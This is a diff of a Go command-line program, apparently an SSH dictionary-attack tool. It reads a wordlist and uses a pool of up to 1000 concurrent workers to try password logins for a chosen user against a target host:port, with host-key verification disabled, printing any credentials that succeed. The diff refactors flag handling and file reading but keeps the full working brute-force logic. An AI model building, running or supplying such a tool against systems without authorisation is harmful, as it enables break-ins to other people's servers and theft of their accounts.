@@ -1,9 +1,10 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
-	"io/ioutil"
 	"log"
+	"os"
 	"strings"
 	"sync"
 
@@ -13,68 +14,81 @@ import (
 )
 
 func main() {
-	u := flag.StringP("user", "u", "", "The user you would like to attack")
-	p := flag.StringP("wordlist", "w", "", "The wordlist to use for dictionary attack")
-	h := flag.StringP("host", "h", "", "The host you want to attack. (host:port)")
-	ps := flag.IntP("poolsize", "s", 1024, "How many concurrent workers can run together")
+	var (
+		u  string
+		p  string
+		h  string
+		ps int
+	)
+
+	flag.StringVarP(&u, "user", "u", "", "The user you would like to attack")
+	flag.StringVarP(&p, "wordlist", "w", "", "The wordlist to use for dictionary attack")
+	flag.StringVarP(&h, "host", "h", "", "The host you want to attack. (host:port)")
+	flag.IntVarP(&ps, "poolsize", "s", 1000, "How many concurrent workers can run together")
 
 	flag.Parse()
 
 	var wg sync.WaitGroup
-	// var mut = &sync.Mutex{}
 
-	if *p == "" {
+	if p == "" {
 		flag.Usage()
 		log.Fatal("flag \"wordlist\" cannot be empty")
 	}
 
-	if *u == "" {
+	if u == "" {
 		flag.Usage()
 		log.Fatal("flag \"usage\" cannot be empty")
 	}
 
-	if *ps == 0 {
+	if ps == 0 {
 		flag.Usage()
 		log.Fatal("flag \"poolsize\" cannot be 0")
 	}
 
-	if *h == "" {
+	if h == "" {
 		flag.Usage()
 		log.Fatal("flag \"host\" cannot be empty")
-	} else if !strings.Contains(*h, ":") {
+	} else if !strings.Contains(h, ":") {
 		flag.Usage()
 		log.Fatal("flag \"host\" : usage: host:port")
 	}
 
-	content, err := ioutil.ReadFile(*p)
+	file, err := os.Open(p)
 	if err != nil {
 		log.Fatal(err)
 	}
+	defer file.Close()
 
-	hp := gohive.NewFixedSizePool(*ps)
+	scanner := bufio.NewScanner(file)
 
-	for _, v := range strings.Split(string(content), "\n") {
+	pool := gohive.NewFixedSizePool(ps)
+
+	for scanner.Scan() {
 		wg.Add(1)
 
-		hp.Submit(func() {
-			defer wg.Done()
-			// mut.Lock()
+		v := scanner.Text()
 
-			conn, err := ssh.Dial("tcp", *h, &ssh.ClientConfig{
-				User:            *u,
+		pool.Submit(func() {
+			defer wg.Done()
+
+			// fmt.Println("trying password", v)
+			conn, err := ssh.Dial("tcp", h, &ssh.ClientConfig{
+				User:            u,
 				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 				Auth: []ssh.AuthMethod{
 					ssh.Password(v),
 				},
 			})
 			if err != nil {
-				// fmt.Println(err)
-			} else {
-				fmt.Printf("found match for %s: %s:%s\n", *h, *u, v)
-				conn.Close()
+				return
 			}
-			// mut.Unlock()
+			conn.Close()
+
+			fmt.Printf("found match for %s: %s:%s\n", h, u, v)
 		})
+	}
+	if err := scanner.Err(); err != nil {
+		log.Fatal(err)
 	}
 
 	wg.Wait()
